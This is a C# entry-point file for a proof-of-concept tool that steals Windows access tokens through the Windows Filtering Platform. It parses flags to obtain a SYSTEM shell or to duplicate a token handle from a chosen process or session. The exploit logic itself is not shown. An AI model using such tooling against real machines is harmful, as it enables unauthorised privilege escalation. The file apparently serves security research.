using System;
using System.Collections.Generic;
using WfpTokenDup.Handler;

namespace WfpTokenDup
{
    internal class WfpTokenDup
    {
        static void Main(string[] args)
        {
            bool isSupported;
            Version osVersion = Environment.OSVersion.Version;

            if (osVersion.Major > 6)
                isSupported = true;
            else if ((osVersion.Major == 6) && (osVersion.Minor > 1))
                isSupported = true;
            else
                isSupported = false;

            if (!isSupported)
            {
                Console.WriteLine("\n[-] This technique supports OSes newer than Win8 or Win Server 2012.\n");
                return;
            }

            var options = new CommandLineParser();

            try
            {
                options.SetTitle("WfpTokenDup - PoC for token stealing with Windows Filtering Platform.");
                options.AddFlag(false, "h", "help", "Displays this help message.");
                options.AddFlag(false, "S", "system", "Flag to get SYSTEM shell.");
                options.AddParameter(false, "p", "pid", null, "Specifies PID to duplicate token handle in decimal format.");
                options.AddParameter(false, "s", "session", null, "Specifies interactive session ID.");
                options.AddParameter(false, "v", "value", null, "Specifies handle value to duplicate token handle in hex format.");
                options.AddExclusive(new List<string> { "system", "pid" });
                options.AddExclusive(new List<string> { "system", "session" });
                options.AddExclusive(new List<string> { "pid", "session" });
                options.Parse(args);

                Execute.Run(options);
            }
            catch (InvalidOperationException ex)
            {
                Console.WriteLine(ex.Message);
            }
            catch (ArgumentException ex)
            {
                options.GetHelp();
                Console.WriteLine(ex.Message);
            }
        }
    }
}
